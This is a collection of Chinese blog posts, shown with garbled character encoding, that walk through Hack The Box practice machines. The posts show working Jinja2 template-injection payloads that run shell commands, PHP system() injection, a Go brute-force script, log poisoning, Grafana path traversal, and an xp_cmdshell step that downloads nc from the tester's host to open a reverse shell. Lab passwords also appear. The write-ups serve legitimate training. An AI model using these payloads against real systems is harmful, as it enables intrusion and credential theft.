[{"title":"HTB Challengesâ€”Web","url":"/2023/02/04/HTB%20Challenges%E2%80%94Web/","content":"Templatedæ‰“å¼€é¡µé¢ï¼Œæœ‰æç¤ºè¯´æ˜¯Flask&#x2F;jinja2æ¡†æ¶æ­å»ºï¼Œä»¥åŠé¶æœºæ ‡é¢˜templatedåˆ¤æ–­ä¸ºsstiæ¨¡æ¿æ³¨å…¥\n\nè¾“å…¥9æµ‹è¯•\n\nå›æ˜¾9ï¼Œç¡®å®šä¸ºsstiæ¨¡æ¿æ³¨å…¥\n\nhttp://178.128.171.82:31589/&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\n&#123;% if c.__name__=='_IterationGuard' %&#125;\n&#123;&#123; c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls ').read()\") &#125;&#125;\n&#123;% endif %&#125;\n&#123;% endfor %&#125;\n\n\nå›æ˜¾äº†ç›®å½•åˆ—è¡¨ï¼ŒæŸ¥çœ‹flag.txt\n\næ‹¿åˆ°flag\nè¿™é‡Œæ˜¯å…¸å‹çš„python-Flaskæ¨¡æ¿æ³¨å…¥ï¼Œä¸€äº›åŸºç¡€payloadï¼š\nè·å¾—åŸºç±»\n#python2.7\n&#39;&#39;.__class__.__mro__[2]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n#python3.7\n&#39;&#39;.__ã€‚ã€‚ã€‚class__.__mro__[1]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n\n#python 2.7\n#æ–‡ä»¶æ“ä½œ\n#æ‰¾åˆ°fileç±»\n[].__class__.__bases__[0].__subclasses__()[40]\n#è¯»æ–‡ä»¶\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()\n#å†™æ–‡ä»¶\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)\n\n#å‘½ä»¤æ‰§è¡Œ\n#osæ‰§è¡Œ\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecacheä¸‹æœ‰osç±»ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼š\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()\n#eval,impoerç­‰å…¨å±€å‡½æ•°\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ä¸‹æœ‰evalï¼Œ__import__ç­‰çš„å…¨å±€å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ï¼š\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()\n\n#python3.7\n#å‘½ä»¤æ‰§è¡Œ\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#æ–‡ä»¶æ“ä½œ\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#windowsä¸‹çš„oså‘½ä»¤\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).r\n\nPhonebookæ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸ªç™»å½•æ¡†\n\nçœ‹åˆ°ç™»å½•æ¡†ï¼Œç¬¬ä¸€ååº”ä¸ºsqlæ³¨å…¥ï¼Œè¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç admin&#39; or &#39;1&#39;=&#39;1ä¸è¡Œï¼Œç„¶åfuzzä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰SQLæ³¨å…¥ï¼Œæ²¡æœ‰æˆåŠŸã€‚\nå°è¯•é€šé…ç¬¦ç™»å½•ï¼Œç”¨æˆ·åå¯†ç éƒ½å¡«*ï¼Œç™»å½•æˆåŠŸ\n\næ˜¯ä¸€ä¸ªæŸ¥è¯¢ç”¨æˆ·ç”µè¯å·ç çš„æœç´¢é¡µé¢ï¼Œåˆ°å¤„ç…ç…é¡µé¢æ²¡å•¥é—®é¢˜\né—®é¢˜å›åˆ°é‚£ä¸ªç™»å½•æ¡†ï¼Œå°†ç”¨æˆ·åæ”¹ä¸ºé¡µé¢ä¸‹ç•™è¨€çš„Reeseï¼Œå¯†ç ä¸º*ï¼Œç™»å½•æˆåŠŸ\nå°†ç”¨æˆ·åæ”¹æˆå…¶ä»–ï¼Œå¯†ç ä¸º*ï¼Œæ— æ³•ç™»å½•\nä¹Ÿå°±æ˜¯è¯´ç™»å½•ç”¨æˆ·åç¡®å®šä¸ºReeseï¼ŒçŒœæµ‹å¯†ç å³ä¸ºflagï¼Œflagæ ¼å¼ä¸ºHTB{}ï¼Œå°†å¯†ç æ”¹ä¸ºH*ï¼Œå‘ç°ç™»å½•æˆåŠŸï¼Œè¯´æ˜çŒœæµ‹æ²¡é”™æ¥ä¸‹æ¥å°±æ˜¯å†™ä¸ªè„šæœ¬çˆ†ç ´å‡ºflagå€¼ã€‚è„šæœ¬åŸç†å³ä¸ºä¸€ä½ä¸€ä½éå†ï¼Œåé¢åŠ ä¸Šä¸€ä¸ªé€šé…ç¬¦ï¼Œå‰é¢ä¸€ä½æ˜¯å¯¹çš„æ—¶ï¼Œä¼šç™»å½•æˆåŠŸï¼Œå¦åˆ™ç™»å½•å¤±è´¥ã€‚\ngoè„šæœ¬å¦‚ä¸‹ï¼š\npackage main\n\nimport (\n    &quot;bytes&quot;\n    &quot;fmt&quot;\n    &quot;io/ioutil&quot;\n    &quot;net/http&quot;\n    &quot;strings&quot;\n)\n\nfunc main() &#123;\n    url := &quot;http://144.126.228.187:30674/login&quot;\n    client := &amp;http.Client&#123;&#125;\n    chars := &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;&quot;\n    flag := &quot;HTB&#123;&quot;\n    password := &quot;&quot;\n    for i := 0; i &lt; len(chars); i++ &#123;\n        password = flag + string(chars[i]) + &quot;*&quot;\n        fmt.Printf(&quot;[-] testing %s&quot;, password)\n        data := []byte(&quot;username=Reese&amp;password=&quot; + password)\n        req, _ := http.NewRequest(&quot;POST&quot;, url, bytes.NewBuffer(data))\n        req.Header.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;)\n        req.Header.Add(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)\n        resp, err := client.Do(req)\n        if err != nil &#123;\n            fmt.Println(&quot;Error:&quot;, err)\n        &#125;\n        defer resp.Body.Close()\n\n        if resp.StatusCode == 200 &#123;\n            bodyBytes, _ := ioutil.ReadAll(resp.Body)\n            bodyString := string(bodyBytes)\n\n            if strings.Contains(bodyString, &quot;No search results&quot;) &#123;\n                flag += string(chars[i])\n                fmt.Println(&quot; success&quot;)\n                fmt.Printf(&quot;[+] %s\\n&quot;, flag)\n                break\n            &#125;\n        &#125;\n        fmt.Println(&quot; failed&quot;)\n\n        if flag[len(flag)-1] == &#39;&#125;&#39; &#123;\n            break\n        &#125;\n    &#125;\n\n    fmt.Printf(&quot;flag: %s\\n&quot;, flag)\n&#125;\n\nLoveToké¢˜ç›®ç»™äº†æºç ï¼Œä¸‹è½½ä¸‹æ¥æŸ¥çœ‹\næ‰“å¼€é¡µé¢ï¼Œç‚¹å‡»æœ€åº•ä¸‹çš„æŒ‰é’®å‡ºç°formatå‚æ•°ï¼ŒçŒœæµ‹è¿™ä¸ªå‚æ•°æœ‰åˆ©ç”¨ç‚¹ï¼Œå»æºç ä¸­æ‰¾åˆ°æ­¤å‚æ•°\n\nåœ¨TimeModel.phpä¸­æ‰¾åˆ°äº†$format\n&lt;?php\nclass TimeModel\n&#123;\n    public function __construct($format)\n    &#123;\n        $this-&gt;format = addslashes($format);\n\n        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];\n        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;\n    &#125;\n\n    public function getTime()\n    &#123;\n        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);\n        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;\n    &#125;\n&#125;\n\nè¿™é‡Œç”¨äº†addslashes()â€”â€”â€“ ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²\næ³¨æ„ä¸‹é¢æœ‰ä¸ªeval()å‡½æ•°ï¼Œå°†$this-&gt;formatåŒ…å«åœ¨äº†é‡Œé¢ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶formatçš„å€¼æ¥è¿›è¡Œeval()æ‰§è¡Œä»£ç ã€‚\næ‰€ä»¥ï¼Œç¬¬ä¸€æ­¥ç»•è¿‡addslashes()çš„è½¬ä¹‰\nä½¿ç”¨phpå¤æ‚å˜é‡è¿›è¡Œç»•è¿‡\nhttps://www.programmersought.com/article/30723400042/\nç®€å•æ¥è¯´ï¼Œ${phpinfo()}ï¼Œä¼šå…ˆæ‰§è¡Œphpinfo(),ç„¶åå°†è¿”å›å€¼ä½œä¸ºå˜é‡å\n\nè¿™é‡Œâ€œè¿˜æ˜¯ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸ªæ–¹å¼ï¼Œä¸ä½¿ç”¨åˆ°è¿™äº›å­—ç¬¦\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls /\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=cat /flagLpfG2\n\n\næ‹¿åˆ°flagï¼Œè¿™å°±æ˜¯ä¸€é“phpå‘½ä»¤æ‰§è¡Œçš„é¢˜ã€‚\nToxicç»™äº†æºç \n&lt;?php\nspl_autoload_register(function ($name)&#123;\n    if (preg_match(&#39;/Model$/&#39;, $name))\n    &#123;\n        $name = &quot;models/$&#123;name&#125;&quot;;\n    &#125;\n    include_once &quot;$&#123;name&#125;.php&quot;;\n&#125;);\n\nif (empty($_COOKIE[&#39;PHPSESSID&#39;]))\n&#123;\n    $page = new PageModel;\n    $page-&gt;file = &#39;/www/index.html&#39;;\n\n    setcookie(\n        &#39;PHPSESSID&#39;, \n        base64_encode(serialize($page)), \n        time()+60*60*24, \n        &#39;/&#39;\n    );\n&#125; \n\n$cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);\nunserialize($cookie);\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œcookieæ˜¯æ–‡ä»¶è¯»å–ç›®å½•ç»è¿‡åºåˆ—åŒ–ä¹‹åå†è¿›è¡Œbase64ç¼–ç åç”Ÿæˆçš„\næŠ“ä¸ªåŒ…\n\ndecode\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€†å‘å»è¯»å–æ•æ„Ÿæ–‡ä»¶\n\næˆåŠŸè¯»å–\n\næ³¨æ„åˆ°æœ€åä¸€è¡Œï¼Œnginxï¼Œæƒ³åˆ°æ—¥å¿—æ–‡ä»¶åŒ…å«\nnginxçš„logåœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logå’Œ&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.logï¼Œå…¶ä¸­access.logå¯ä»¥æ‰“å¼€ã€‚\nå°è¯•è¯»ä¸€ä¸‹\n\n\nå¯ä»¥çœ‹åˆ°æ—¥å¿—æ–‡ä»¶ä¸ºè¯·æ±‚å¤´æ–‡ä»¶\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†è¯·æ±‚å¤´ä¸­çš„User-Agentå­—æ®µæ›´æ”¹ä¸ºæ¶æ„ä»£ç ï¼Œè¿™æ ·å°±ä¼šè‡ªåŠ¨å†™å…¥æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶åè¢«æ‰§è¡Œã€‚\n\nå†æ¬¡è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œä¹‹å‰æ›´æ”¹äº†uaçš„è®¿é—®å·²ç»è¢«è®°å½•\n\nphpä»£ç ä¹Ÿå·²ç»è¢«æ‰§è¡Œï¼Œå›æ˜¾äº†flag\n","tags":["æ‰“é¶","Web","HTB"]},{"title":"Ambassadoré¶æœº","url":"/2023/01/31/Ambassador%E9%9D%B6%E6%9C%BA/","content":"Ambassadoré¶æœº\nä¿¡æ¯æ”¶é›†æ‰“å¼€é¶æœºç¯å¢ƒï¼Œæ‹¿åˆ°é¶æœºip\nnmapæ‰«æç«¯å£\n\n\næ‰«å‡º22 80 3000 3306ç«¯å£\nè®¿é—®80ä»¥åŠ3000ç«¯å£\n\næ–‡ç« æç¤ºï¼Œæœ‰ä¸€ä¸ªdeveloperè´¦æˆ·å¯ä»¥å»è®¿é—®ssh\n\nè®¿é—®3000ç«¯å£å‘ç°æ˜¯Grafanaç³»ç»Ÿ\n3000ç«¯å£æ¼æ´å‘ç°Googleä¸€ä¸‹ï¼Œå‘ç°æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´\n\nä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ©ç”¨åŒæ—¶ï¼Œsearchsploitä¹Ÿèƒ½æœåˆ°è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨exp\n\n\n\nå¯ä»¥çœ‹åˆ°è¯»å– &#x2F;etc&#x2F;passwd æˆåŠŸï¼Œä¹Ÿå°±æ„å‘³ç€å¯ä»¥è¯»å–åˆ°ä»»æ„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯»ä¸€ä¸‹è¿™ä¸ªGrafanaç³»ç»Ÿçš„é…ç½®æ–‡ä»¶æ¥è·å–ä¿¡æ¯\ngoogleä¸€ä¸‹ï¼Œå¾—åˆ°é…ç½®æ–‡ä»¶è·¯å¾„ &#x2F;etc&#x2F;grafana&#x2F;grafana.ini\n\nè¯»å–é…ç½®æ–‡ä»¶ï¼Œç¿»çœ‹æ‰¾åˆ°æ•°æ®åº“é…ç½®ä»¥åŠç½‘ç«™ç”¨æˆ·åå¯†ç \n\n\nç™»å…¥ç½‘ç«™åå°ï¼Œæ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯\n\ngrafana.dbæ•°æ®åº“æŸ¥æ‰¾è¿™æ—¶å€™å¯ä»¥å°†æ•°æ®åº“è„±å‡ºæ¥ï¼ŒæŸ¥æ‰¾3306ç«¯å£çš„ç”¨æˆ·åå¯†ç \nå…ˆå°†grafana.dbä¸‹è½½ä¸‹æ¥ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨å‘½ä»¤æ¥æ“ä½œ\n\nè¿™é‡Œç”¨åˆ°â€“path-as-is ä¸ä¼šå‹ç¼©urlï¼Œå¦‚æœä¸ç”¨å°±ä¼šæŠŠ..&#x2F;..&#x2F;..&#x2F;ç»™å¿½ç•¥å°±ä¼šè®¿é—®ä¸åˆ°æ•°æ®åº“æ–‡ä»¶\n\n3306ç«¯å£è¿æ¥åœ¨data_sourceä¸‹æ‰¾åˆ°mysqlç”¨æˆ·åå’Œå¯†ç ï¼Œè´¦å·ï¼šgrafana å¯†ç ï¼šdontStandSoCloseToMe63221!ï¼Œæ‹¿å»ç™»å½•3306ç«¯å£\n\nè¿æ¥æˆåŠŸï¼Œä¸€é€šæ“ä½œï¼Œåœ¨whackywidgetæ•°æ®åº“é‡Œæ‰¾åˆ°äº†developerç”¨æˆ·çš„å¯†ç ï¼Œæ ¹æ®80ç«¯å£çš„ç½‘ç«™æç¤ºï¼Œè¿™ä¸ªç”¨æˆ·å¯ä»¥ç™»å½•sshï¼Œbase64è§£å¯†åç™»å½•sshã€‚\n\nè§£ç å¾—åˆ°æ˜æ–‡å¯†ç \n22ç«¯å£è¿æ¥\næˆåŠŸè¿æ¥\n\næ‹¿åˆ°äº†useræƒé™ï¼ŒåŒæ—¶å¾—åˆ°äº†userçš„flag\nææƒè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ææƒåˆ°rootç”¨æˆ·æƒé™è·å–flag\n1.å†…æ ¸ææƒ\n\nå¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰å¯ç”¨çš„exp\n2.sudoææƒhttps://blog.csdn.net/god_zzZ/article/details/113628793\n\nå¯ä»¥çœ‹åˆ°ä¸å­˜åœ¨è¯¥æ¼æ´ï¼Œæ— æ³•ææƒ\n3.SUIDææƒhttps://blog.csdn.net/Fly_hps/article/details/80428173\n\næ²¡æœ‰èƒ½å¤Ÿç”¨æ¥ææƒçš„ç›®æ ‡\n4.è®¡åˆ’ä»»åŠ¡ææƒhttps://blog.csdn.net/q20010619/article/details/121422797\n\næ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹\n5.&#x2F;git consul APIææƒ\nå¯ä»¥çœ‹åˆ°ï¼Œå¼€äº†ä¸€ä¸ªconsulæœåŠ¡\nhttps://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec\nè¿™ä¸ªæœåŠ¡çš„ç›®æ ‡ç«¯å£ä¸º80ã€443ã€3000ã€8000ã€8008ã€8080ã€8443ï¼Œ 8500ã€8880ã€8888\næŸ¥çœ‹å¼€äº†å“ªäº›ç«¯å£\n\nç¡®å®šæœåŠ¡å™¨æ˜¯ç”¨8500ç«¯å£å¼€çš„è¿™ä¸ªconsulæœåŠ¡\nè®¿é—®å¤±è´¥\n\nç›´æ¥è·‘msfé‡Œçš„expä¹Ÿå¤±è´¥\nç«¯å£è½¬å‘å·²çŸ¥ä¹‹å‰nmapæ‰«ç«¯å£ä¹Ÿæ²¡æ‰«åˆ°8500ï¼Œå®¹æ˜“å¾—æ‰“ï¼Œ8500ç«¯å£åªå¯¹å†…ç½‘å¼€æ”¾ï¼Œè¿™æ—¶å€™å°±éœ€è¦å°†ç«¯å£è½¬å‘åˆ°æœ¬åœ°\n\nåå¼¹shellåˆ©ç”¨msfä¸­çš„exp\n\næŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°è¿›è¡Œé…ç½®\n\nåå¼¹æˆåŠŸ\n\nå¾—åˆ°flag\n","tags":["æ‰“é¶","HTB","æ¸—é€æµ‹è¯•"]},{"title":"Archetypeé¶æœº","url":"/2023/02/03/Archetype%E9%9D%B6%E6%9C%BA/","content":"  æ•´ä¸ªæµç¨‹å¾ˆæ˜äº†ï¼Œæ‰«å‡ºå¼€æ”¾ç«¯å£ï¼Œsmbè¿œç¨‹è¿æ¥ï¼Œæ‹¿åˆ°æ•°æ®åº“å¯†ç ï¼Œåˆ©ç”¨mssqlclientå»ºç«‹è¿æ¥ï¼Œåˆ©ç”¨xp_cmdshellä¼ ncï¼Œåå¼¹shellæ‹¿åˆ°æ™®é€šç”¨æˆ·æƒé™ï¼Œåˆ©ç”¨WinPEASææƒï¼Œæ‹¿åˆ°æœ€é«˜æƒé™å¯†ç ï¼Œå†é€šè¿‡psexecæ‹¿æœ€é«˜æƒé™shellã€‚æ•´ä½“æ€è·¯å¾ˆæ˜ç¡®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸æ•°æ®åº“è¿æ¥åxp_cmdshellçš„å¼€å¯ï¼Œé€šè¿‡xp_cmdshellæ‰§è¡Œpowershellå‘½ä»¤çš„å†™æ³•ï¼Œé€šè¿‡xp_cmdshellä¼ ncå’Œwinpeasæ—¶çš„ç›®å½•æ˜¯å¦æœ‰å†™å…¥æƒé™ï¼Œåå¼¹ncæ—¶ç«¯å£çš„å¼€å¯ã€‚è¿™é‡Œé—®ç­”é¢˜ä¸ä¸€ä¸€å†™å‡ºäº†ï¼Œç­”æ¡ˆè¿‡ç¨‹ä¸­éƒ½æœ‰ã€‚\n\n\nå¸¸è§„nmapæ‰«æ\n\nå¯ä»¥çœ‹åˆ°139å’Œ445ç«¯å£å¼€äº†smbæœåŠ¡ï¼Œ1433ç«¯å£å¼€äº†æ•°æ®åº“ã€‚\nç”¨smbclientè¿æ¥\nsmbclient -L 10.129.251.225 åˆ—å‡ºå…±äº«æ–‡ä»¶\n\n\n\n\nè¿æ¥backupsæ–‡ä»¶å¤¹\n\nå°†prod.dtsConfigæ–‡ä»¶getåˆ°æœ¬åœ°æŸ¥çœ‹ï¼Œå¾—åˆ°passwd:M3g4c0rp123ï¼Œuser id:ARCHETYPE\\SqL_svc\næ¥ä¸‹æ¥åˆ©ç”¨impacketåŒ…ä¸‹çš„mssqlclient.pyä¸æ•°æ®åº“å»ºç«‹è¿æ¥\n\næ‰§è¡ŒSELECT IS_SRVROLEMEMBER(â€˜sysadminâ€™) æŸ¥çœ‹æƒé™ï¼Œå›æ˜¾1ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·æœ‰sysadminæƒé™\næ¥ç€enable_xp_cmdshell; è·å–xp_cmdshell\nxp_cmdshell å¯ä»¥è®©ç³»ç»Ÿç®¡ç†å‘˜ä»¥æ“ä½œç³»ç»Ÿå‘½ä»¤è¡Œè§£é‡Šå™¨çš„æ–¹å¼æ‰§è¡Œç»™å®šçš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œæ˜¯ sql servevr çš„åŸç”Ÿå·¥å…·\nä¹Ÿå°±æ˜¯è¯´æŠŠxp_cmdshellå¼€å¯åï¼Œå¯ä»¥åœ¨sqlä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\næœ¬åœ°ç›‘å¬80ç«¯å£\n\nè®¿é—®å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ¬æœºçš„æ–‡ä»¶\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†payloadæ”¾åœ¨æœ¬æœºä¸­ï¼Œç„¶åé€šè¿‡xp_cmdshellæ¥è®¿é—®æˆ‘ä»¬æœ¬æœºæ–‡ä»¶æ¥ä¸‹è½½åˆ°ç›®æ ‡æœåŠ¡å™¨\nç„¶åæœ¬åœ°ncç›‘å¬ï¼Œç›®æ ‡æœåŠ¡å™¨ä½¿ç”¨ncè¿æ¥è·å–shell\n\né€šè¿‡wgetä¸‹è½½ï¼Œå‘ç°æ²¡æœ‰æƒé™\næ¢ä¸ªæœ‰æ‰§è¡Œå†™å…¥æƒé™çš„ç›®å½•\n\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;wget http://10.10.16.10/nc64.exe -outfile nc64.exe&quot;\nåˆ‡æ¢åˆ°downloadsç›®å½•ï¼Œé€šè¿‡wgetè·å–åˆ°æœ¬æœºnc64.exeä¸‹è½½åˆ°ç›®å½•ä¸‹\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;dir&quot;\ndiræŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸‹è½½æˆåŠŸ\nå¼€å¯ncç›‘å¬4443ç«¯å£\n\nä¸»æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¼€å¯nc\n\nåå¼¹æˆåŠŸ\n\n\næ‹¿åˆ°userä¸‹çš„flag\næ¥ä¸‹æ¥ï¼Œææƒåˆ°rootç”¨æˆ·\nä½¿ç”¨åˆ°WinPEASå·¥å…·ï¼Œè¿™ä¸ª WinPEAS æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæœç´¢åœ¨ Windows ä¸»æœºä¸Šæå‡æƒé™çš„å¯èƒ½æ–¹æ³•ï¼Œè¿›è¡Œæ‰«æ\n\nåœ¨ä¸»æœºä¸Šæ‰§è¡Œ\n\nåœ¨ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸­æŸ¥çœ‹åˆ°äº†administratorçš„å¯†ç MEGACORP_4dm1n!!ï¼Œè¿™ä¸ªConsoleHost_history.txtæ˜¯powershellçš„å†å²æ–‡ä»¶ï¼Œç›¸å½“äº Linux ç³»ç»Ÿçš„.bash_history\n\næ¥ä¸‹æ¥ä½¿ç”¨impacketåŒ…ä¸‹çš„psexec.pyè¿›è¡Œè¿æ¥ç™»å½•\nPsExec æ˜¯ä¸€ä¸ªè½»å‹çš„ telnet æ›¿ä»£å·¥å…·ï¼Œå®ƒä½¿æ‚¨æ— éœ€æ‰‹åŠ¨å®‰è£…å®¢æˆ·ç«¯è½¯ä»¶å³å¯æ‰§è¡Œå…¶ä»–ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ï¼Œå¹¶ä¸”å¯ä»¥è·å¾—ä¸æ§åˆ¶å°åº”ç”¨ç¨‹åºç›¸å½“çš„å®Œå…¨äº¤äº’æ€§ã€‚PsExec æœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯åœ¨è¿œç¨‹ç³»ç»Ÿå’Œè¿œç¨‹æ”¯æŒå·¥å…·ï¼ˆå¦‚ IpConfigï¼‰ä¸­å¯åŠ¨äº¤äº’å¼å‘½ä»¤æç¤ºçª—å£ï¼Œä»¥ä¾¿æ˜¾ç¤ºæ— æ³•é€šè¿‡å…¶ä»–æ–¹å¼æ˜¾ç¤ºçš„æœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ã€‚\n\næœ€åè¿æ¥è¿™é‡Œï¼Œä¸€ç›´è¿æ¥å‡ºé”™ï¼Œå°±é‡å¯äº†å°æœºå™¨ã€‚\n\nå¾—åˆ°rootæƒé™ä¸‹çš„flag\n\n","tags":["æ‰“é¶","HTB","æ¸—é€æµ‹è¯•"]},{"title":"Hack the box-Starting point TIER0é€šå…³","url":"/2023/02/01/Hack%20the%20box-Starting%20point%20TIER0%E9%80%9A%E5%85%B3/","content":"TIER0Meowé¶æœº\n1ï¼‰ä¸‹è½½openvpnçš„é…ç½®ï¼Œè¿›è¡Œè¿æ¥\n\næŸ¥çœ‹æ˜¯å¦è¿æ¥æˆåŠŸ\n\n2ï¼‰åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹ï¼šæ–°å®ä¾‹å†…ç½‘ipä¸º10.129.98.33\n\n3ï¼‰æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›é—®ç­”é¢˜\n\n1.What does the acronym VM stand for?ï¼ˆVMæ˜¯ä»€ä¹ˆçš„ç¼©å†™ï¼‰virtual machine2.What tool do we use to interact with the operating system in order to start our vpn connection?(æˆ‘ä»¬ç”¨ä»€ä¹ˆå·¥å…·ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’è¿›è€Œå¼€å¯æˆ‘ä»¬çš„vpnè¿æ¥ï¼Ÿ)terminal3.What service do we use to form our vpn connection?ï¼ˆæˆ‘ä»¬ç”¨ä»€ä¹ˆæœåŠ¡å½¢æˆæˆ‘ä»¬vpnè¿æ¥ï¼Ÿï¼‰openvpn4.What is the abreviated name for a tunnel interface in the output of your vpn boot-up sequence output?ï¼ˆvpnå¯åŠ¨åéš§é“æ¥å£çš„ç¼©å†™åç§°æ˜¯ä»€ä¹ˆï¼‰tun5.What tool do we use to test our connection to the target?ï¼ˆæˆ‘ä»¬ç”¨ä»€ä¹ˆå·¥å…·æ¥æµ‹è¯•ä¸ç›®æ ‡é¶æœºçš„è¿æ¥ï¼Ÿï¼‰ping6.What is the name of the tool we use to scan the targetâ€™s ports?ï¼ˆæˆ‘ä»¬ç”¨ä»€ä¹ˆå·¥å…·æ¥æ‰«æç›®æ ‡é¶æœºçš„ç«¯å£ï¼Ÿï¼‰nmap7.What service do we identify on port 23&#x2F;tcp during our scans?ï¼ˆåœ¨æˆ‘ä»¬çš„æ‰«æç»“æœä¸­tcp23ç«¯å£è¢«æˆ‘ä»¬è®¤å®šä¸ºæ˜¯ä»€ä¹ˆæœåŠ¡ï¼‰telnet8.What username ultimately works with the remote management login prompt for the target?ï¼ˆå“ªä¸ªç”¨æˆ·åæœ€ç»ˆå¯ä»¥æˆåŠŸè¿œç¨‹ç™»å½•åˆ°ç›®æ ‡é¶æœºï¼Ÿï¼‰root\n9.è·å–flag\nnmapæ¢æµ‹å¼€æ”¾ç«¯å£\n\næ‰«å‡º23ç«¯å£telnetæœåŠ¡\nå°è¯•è¿æ¥\n\nrootç”¨æˆ·ï¼Œç©ºå¯†ç 